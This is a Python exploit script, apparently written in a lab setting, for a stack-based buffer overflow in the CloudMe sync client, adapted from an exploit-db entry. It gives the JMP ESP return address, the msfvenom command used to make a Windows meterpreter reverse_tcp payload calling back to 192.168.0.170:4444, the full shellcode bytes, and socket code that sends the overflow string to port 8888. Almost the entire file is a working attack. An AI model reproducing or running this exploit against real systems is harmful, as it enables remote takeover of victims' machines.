#Created by: Uday Mittal (Yaksas CSC)
#This code exploits the stack-based buffer overflow vulnerability in CloudMe. 
#Credit: https://www.exploit-db.com/exploits/44470


import socket

# EIP Over-written by: 316A4230

#JMP ESP
# Address=699A0159 Message=  0x699a0159 : push esp # ret 0x04 |  {PAGE_EXECUTE_READ} [Qt5Network.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.9.0.0 (C:\Users\ptlabmachine\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll)

#shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.170 LPORT=4444 -b \x00\x0a -f python

buf =  b""
buf += b"\xdd\xc3\xbd\x17\xde\x83\x71\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x56\x83\xef\xfc\x31\x6f\x14\x03\x6f\x03\x3c"
buf += b"\x76\x8d\xc3\x42\x79\x6e\x13\x23\xf3\x8b\x22\x63\x67"
buf += b"\xdf\x14\x53\xe3\x8d\x98\x18\xa1\x25\x2b\x6c\x6e\x49"
buf += b"\x9c\xdb\x48\x64\x1d\x77\xa8\xe7\x9d\x8a\xfd\xc7\x9c"
buf += b"\x44\xf0\x06\xd9\xb9\xf9\x5b\xb2\xb6\xac\x4b\xb7\x83"
buf += b"\x6c\xe7\x8b\x02\xf5\x14\x5b\x24\xd4\x8a\xd0\x7f\xf6"
buf += b"\x2d\x35\xf4\xbf\x35\x5a\x31\x09\xcd\xa8\xcd\x88\x07"
buf += b"\xe1\x2e\x26\x66\xce\xdc\x36\xae\xe8\x3e\x4d\xc6\x0b"
buf += b"\xc2\x56\x1d\x76\x18\xd2\x86\xd0\xeb\x44\x63\xe1\x38"
buf += b"\x12\xe0\xed\xf5\x50\xae\xf1\x08\xb4\xc4\x0d\x80\x3b"
buf += b"\x0b\x84\xd2\x1f\x8f\xcd\x81\x3e\x96\xab\x64\x3e\xc8"
buf += b"\x14\xd8\x9a\x82\xb8\x0d\x97\xc8\xd4\xe2\x9a\xf2\x24"
buf += b"\x6d\xac\x81\x16\x32\x06\x0e\x1a\xbb\x80\xc9\x2b\xab"
buf += b"\x32\x05\x93\xbc\xcc\xa6\xe3\x95\x0a\xf2\xb3\x8d\xbb"
buf += b"\x7b\x58\x4e\x43\xae\xf4\x44\xd3\x91\xa0\x59\x89\x7a"
buf += b"\xb2\x59\xdc\x26\x3b\xbf\x8e\x86\x6b\x10\x6f\x77\xcb"
buf += b"\xc0\x07\x9d\xc4\x3f\x37\x9e\x0f\x28\xd2\x71\xf9\x00"
buf += b"\x4b\xeb\xa0\xdb\xea\xf4\x7f\xa6\x2d\x7e\x75\x56\xe3"
buf += b"\x77\xfc\x44\x14\xe0\xfe\x94\xe5\x85\xfe\xfe\xe1\x0f"
buf += b"\xa9\x96\xeb\x76\x9d\x38\x13\x5d\x9e\x3f\xeb\x20\x96"
buf += b"\x34\xda\xb6\x96\x22\x23\x57\x16\xb3\x75\x3d\x16\xdb"
buf += b"\x21\x65\x45\xfe\x2d\xb0\xfa\x53\xb8\x3b\xaa\x00\x6b"
buf += b"\x54\x50\x7e\x5b\xfb\xab\x55\xdf\xfc\x53\x2b\xc8\xa4"
buf += b"\x3b\xd3\x48\x55\xbb\xb9\x48\x05\xd3\x36\x66\xaa\x13"
buf += b"\xb6\xad\xe3\x3b\x3d\x20\x41\xda\x42\x69\x07\x42\x42"
buf += b"\x9e\x9c\x75\x39\xef\x23\x76\xbe\xf9\x47\x77\xbe\x05"
buf += b"\x76\x44\x68\x3c\x0c\x8b\xa8\x7b\x1f\xbe\x8d\x2a\x8a"
buf += b"\xc0\x82\x2d\x9f"


evilString = "A" * 1052 + "\x59\x01\x9A\x69" + "\x90" * 100 + buf

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',8888))
s.send(evilString)
s.close()
